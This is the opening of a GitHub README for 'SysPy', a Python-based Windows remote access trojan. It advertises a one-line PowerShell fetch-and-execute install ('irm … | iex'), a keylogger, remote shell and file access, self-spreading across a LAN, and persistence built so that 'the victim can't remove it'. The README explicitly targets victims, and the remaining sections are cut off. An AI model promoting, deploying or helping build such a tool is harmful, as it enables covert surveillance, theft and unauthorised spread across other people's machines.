<div align="center">

# 🦇 SysPy

### A dependency-free remote administration toolkit that fits in one line.

**Drop a single PowerShell command on a Windows box. Get a full remote desktop, shell, file manager, keylogger and LAN-wide spreader in your browser.**

[![Version](https://img.shields.io/badge/version-5.1.0-00d9ff?style=for-the-badge)](https://github.com/xgoat-tbh/Package/commits/main)
[![Python](https://img.shields.io/badge/python-3.8%2B%20%7C%20embedded-3776ab?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Dependencies](https://img.shields.io/badge/dependencies-ZERO-00c853?style=for-the-badge)](https://github.com/xgoat-tbh/Package)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/xgoat-tbh/Package)
[![License](https://img.shields.io/badge/license-MIT-f5c518?style=for-the-badge)](LICENSE)

<sub>**No pip. No installer. No admin prompt on the victim. No agent binary to compile.**</sub>

</div>

---

## 📖 Table of Contents

| | | |
|---|---|---|
| [✨ Why SysPy](#-why-syspy) | [🏗️ Architecture](#️-architecture) | [🚀 Quick Start](#-quick-start) |
| [💉 The One-Liner](#-the-one-liner) | [🖥️ Dashboard Tour](#️-dashboard-tour) | [⌨️ Command Reference](#️-command-reference) |
| [🌐 LAN Spread](#-lan-spread--tree-mode) | [🕵️ Stealth & Persistence](#️-stealth--persistence) | [🔐 Security Model](#-security-model) |
| [⚙️ Configuration](#️-configuration) | [🧹 Removing It](#-removing-it) | [🔧 Troubleshooting](#-troubleshooting) |
| [📁 Repo Layout](#-repo-layout) | [🗺️ Roadmap](#️-roadmap) | [❓ FAQ](#-faq) |

---

## ✨ Why SysPy

Most RATs make you choose: **easy to deploy** *or* **powerful**. SysPy refuses the tradeoff.

| | |
|---|---|
| 🎯 **One-line install** | `irm … \| iex`. That's the entire deployment. |
| 📦 **Zero dependencies** | The MQTT client, WebSocket client, HTTP router and crypto are all hand‑rolled against the Python stdlib. Nothing to `pip install`. |
| 🐍 **No Python needed** | If the victim has no interpreter, the controller serves a private embedded one. |
| 🛡️ **Survives removal** | Four autostart vectors, a WMI consumer, a `SYSTEM` boot task and a watchdog. The victim can't remove it — only you can. |
| 🌐 **LAN‑wide spread** | One infected PC becomes ten. Pull and push tiers, tree topology, hop‑limited. |

... (rest of README content omitted for brevity)